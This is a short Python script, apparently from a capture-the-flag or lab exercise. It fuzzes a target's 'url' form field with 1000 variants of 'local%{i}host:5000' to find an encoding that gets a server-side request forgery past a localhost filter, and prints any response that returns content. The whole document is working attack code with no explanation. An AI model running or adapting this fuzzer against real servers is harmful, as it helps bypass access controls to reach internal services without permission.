import requests as req
import sys
url = sys.argv[1]
for i in range(1000):
    data = f'url=local%{i}host:5000'
    headers = { 
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(data)),
            "DNT": "1",
            "Upgrade-Insecure-Requests": "1",
            }
    res = req.post(url,data=str(data),headers=headers)
    if '{"content":""}' not in res.text:
        print(data)
        print(res.text)
